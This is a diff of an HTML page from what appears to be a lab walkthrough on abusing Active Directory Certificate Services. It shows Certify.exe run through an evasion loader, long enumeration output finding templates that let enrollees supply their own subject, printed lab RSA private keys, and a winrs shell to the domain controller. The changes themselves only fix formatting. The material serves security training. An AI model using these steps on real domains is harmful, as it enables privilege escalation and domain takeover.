@@ -282,7 +282,7 @@ Encoding the Certify.exe argument (cas) using ArgSplit.bat and passing it dynami
 
 <p>Let’s now run our Certify.exe and enumerate if there’s any ADCS configured our domain target.
 C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Certify.exe -args "%Pwn%"
-<pre><code>   _____          _   _  __
+<pre><code class="language-bash">   _____          _   _  __
   / ____|        | | (_)/ _|
  | |     ___ _ __| |_ _| |_ _   _
  | |    / _ \ '__| __| |  _| | | |
@@ -371,7 +371,7 @@ Certify completed in 00:00:19.2352015
 
 Our enumeration confirms that Active Directory Certificate Services (ADCS) is configured on the Techcorp domain, with at least one Enterprise Certificate Authority (CA) named TECHCORP-DC-CA running on Techcorp-DC.techcorp.local. The CA supports NT authentication and is classified as an Advanced CA Server.
 We can confirm that the Certificate Authority (CA) supports NT authentication and is classified as an Advanced CA Server by looking at the Enterprise/Enrollment CAs section in our Certify output.
-<pre><code>Enterprise CA Name            : TECHCORP-DC-CA
+<pre><code class="language-bash">Enterprise CA Name            : TECHCORP-DC-CA
 DNS Hostname                  : Techcorp-DC.techcorp.local
 FullName                      : Techcorp-DC.techcorp.local\TECHCORP-DC-CA
 Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
@@ -382,7 +382,7 @@ ArgSplit.bat
 <img src="./images/screenshot_225.png" alt="">
 
 <p>C:\AD\Tools\Loader.exe -Path C:\AD\Tools\ -args "%Pwn%"
-<pre><code>  _____          _   _  __
+<pre><code class="language-bash">  _____          _   _  __
   / ____|        | | (_)/ _|
  | |     ___ _ __| |_ _| |_ _   _
  | |    / _ \ '__| __| |  _| | | |
@@ -430,7 +430,7 @@ ArgSplit.bat
     mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
     Authorized Signatures Required        : 0
     pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
-    mspki-certificate-application-policy  : <null>
+    mspki-certificate-application-policy  : &lt;null&gt;
     Permissions
       Enrollment Permissions
         Enrollment Rights           : TECHCORP\Domain Admins        S-1-5-21-2781415573-3701854478-2406986946-512
@@ -454,7 +454,7 @@ ArgSplit.bat
     mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
     Authorized Signatures Required        : 0
     pkiextendedkeyusage                   : Encrypting File System
-    mspki-certificate-application-policy  : <null>
+    mspki-certificate-application-policy  : &lt;null&gt;
     Permissions
       Enrollment Permissions
         Enrollment Rights           : TECHCORP\Domain Admins        S-1-5-21-2781415573-3701854478-2406986946-512
@@ -478,7 +478,7 @@ ArgSplit.bat
     mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
     Authorized Signatures Required        : 0
     pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Microsoft Trust List Signing, Secure Email
-    mspki-certificate-application-policy  : <null>
+    mspki-certificate-application-policy  : &lt;null&gt;
     Permissions
       Enrollment Permissions
         Enrollment Rights           : TECHCORP\Domain Admins        S-1-5-21-2781415573-3701854478-2406986946-512
@@ -501,7 +501,7 @@ ArgSplit.bat
     mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, AUTO_ENROLLMENT
     Authorized Signatures Required        : 0
     pkiextendedkeyusage                   : File Recovery
-    mspki-certificate-application-policy  : <null>
+    mspki-certificate-application-policy  : &lt;null&gt;
     Permissions
       Enrollment Permissions
         Enrollment Rights           : TECHCORP\Domain Admins        S-1-5-21-2781415573-3701854478-2406986946-512
@@ -524,7 +524,7 @@ ArgSplit.bat
     mspki-enrollment-flag                 : AUTO_ENROLLMENT
     Authorized Signatures Required        : 0
     pkiextendedkeyusage                   : Client Authentication, Server Authentication
-    mspki-certificate-application-policy  : <null>
+    mspki-certificate-application-policy  : &lt;null&gt;
     Permissions
       Enrollment Permissions
         Enrollment Rights           : TECHCORP\Domain Admins        S-1-5-21-2781415573-3701854478-2406986946-512
@@ -548,7 +548,7 @@ ArgSplit.bat
     mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
     Authorized Signatures Required        : 0
     pkiextendedkeyusage                   : Client Authentication, Server Authentication
-    mspki-certificate-application-policy  : <null>
+    mspki-certificate-application-policy  : &lt;null&gt;
     Permissions
       Enrollment Permissions
         Enrollment Rights           : NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERSS-1-5-9
@@ -574,7 +574,7 @@ ArgSplit.bat
     mspki-enrollment-flag                 : NONE
     Authorized Signatures Required        : 0
     pkiextendedkeyusage                   : Server Authentication
-    mspki-certificate-application-policy  : <null>
+    mspki-certificate-application-policy  : &lt;null&gt;
     Permissions
       Enrollment Permissions
         Enrollment Rights           : TECHCORP\Domain Admins        S-1-5-21-2781415573-3701854478-2406986946-512
@@ -596,8 +596,8 @@ ArgSplit.bat
     msPKI-Certificates-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
     mspki-enrollment-flag                 : NONE
     Authorized Signatures Required        : 0
-    pkiextendedkeyusage                   : <null>
-    mspki-certificate-application-policy  : <null>
+    pkiextendedkeyusage                   : &lt;null&gt;
+    mspki-certificate-application-policy  : &lt;null&gt;
     Permissions
       Enrollment Permissions
         Enrollment Rights           : TECHCORP\Domain Admins        S-1-5-21-2781415573-3701854478-2406986946-512
@@ -811,7 +811,7 @@ ArgSplit.bat
 <img src="./images/screenshot_229.png" alt="">
 
 <p>C:\AD\Tools\Loader.exe -Path C:\AD\Tools\ -args "%Pwn%" "/enrolleeSuppliesSubject"
-<pre><code>  _____          _   _  __
+<pre><code class="language-bash">  _____          _   _  __
   / ____|        | | (_)/ _|
  | |     ___ _ __| |_ _| |_ _   _
  | |    / _ \ '__| __| |  _| | | |
@@ -857,7 +857,7 @@ Enabled certificate templates where users can supply a SAN:
     mspki-enrollment-flag                 : NONE
     Authorized Signatures Required        : 0
     pkiextendedkeyusage                   : Server Authentication
-    mspki-certificate-application-policy  : <null>
+    mspki-certificate-application-policy  : &lt;null&gt;
     Permissions
       Enrollment Permissions
         Enrollment Rights           : TECHCORP\Domain Admins        S-1-5-21-2781415573-3701854478-2406986946-512
@@ -879,8 +879,8 @@ Enabled certificate templates where users can supply a SAN:
     msPKI-Certificates-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
     mspki-enrollment-flag                 : NONE
     Authorized Signatures Required        : 0
-    pkiextendedkeyusage                   : <null>
-    mspki-certificate-application-policy  : <null>
+    pkiextendedkeyusage                   : &lt;null&gt;
+    mspki-certificate-application-policy  : &lt;null&gt;
     Permissions
       Enrollment Permissions
         Enrollment Rights           : TECHCORP\Domain Admins        S-1-5-21-2781415573-3701854478-2406986946-512
@@ -976,7 +976,7 @@ C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Certify.exe -args "%Pwn%" /ca:Techcorp-
 <img src="./images/screenshot_233.png" alt="">
 
 Note that Certify.exe will still show the context as studentuser163 or our current user in this case, but this can be ignored. From the Certify.exe output we should simply copy both keys as we do have it below and save it into a cert.pem file and convert this cert.pem into .pfx file using OpenSSL.
-<pre><code>-----BEGIN RSA PRIVATE KEY-----
+<pre><code class="language-bash">-----BEGIN RSA PRIVATE KEY-----
 MIIEpQIBAAKCAQEAxjx7Iiz/8MVfX6WyoejdwIwkx2ySXSUJjv5dwo6eEIBz10dA
 uoTt9xLWW1jBivPUXcYG2KKQfmoBxA3C4m4fwU/WcMjkYO9JU8KUiwCSzfqXClRN
 51x8DV6GBibGWDjX/Cgo72zdfLHj3mBI8PeWcaHnMcpsW3MfUxNn5EKJMuCAViHh
@@ -1092,7 +1092,7 @@ C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Certify.exe -args "%Pwn%" /ca:Techcorp-
 <img src="./images/screenshot_242.png" alt="">
 
 Note that Certify.exe will still show the context as studentuser163 or our current user in this case, but this can be ignored. From the Certify.exe output we should simply copy both keys as we do have it below and save it into a cert.pem file and convert this cert.pem into .pfx file using OpenSSL.
-<pre><code>-----BEGIN RSA PRIVATE KEY-----
+<pre><code class="language-bash">-----BEGIN RSA PRIVATE KEY-----
 MIIEpAIBAAKCAQEAwINio1nC6t+6tvZ/gXJkuSRlkvYO87tDbA6gsalCN8ot6xM1
 G3OWXcO4PNsJuWE0aHLxfIhVhwHPdoBLPztRBsvKyflgOdeH1KM+NWQcQhkhI/j7
 MsMuabDycLUwvcWiT3rCLFgjnqQ/zytisuaBxM1buoEcvE4NQIdSVpMVVED909wu
@@ -1189,7 +1189,7 @@ winrs -r:techcorp-dc cmd
 
 
 
-          <div class="part-navigation">
+<div class="part-navigation">
             <a href="part-19-domain-persistence-adminsdholder-attack.html"><ion-icon name="arrow-back-outline"></ion-icon> Previous: Domain Persistence - AdminSDHo</a>
             <a href="part-21-shadow-credentials-abusing-user-object.html">Next: Shadow Credentials - Abusing U <ion-icon name="arrow-forward-outline"></ion-icon></a>
           </div>
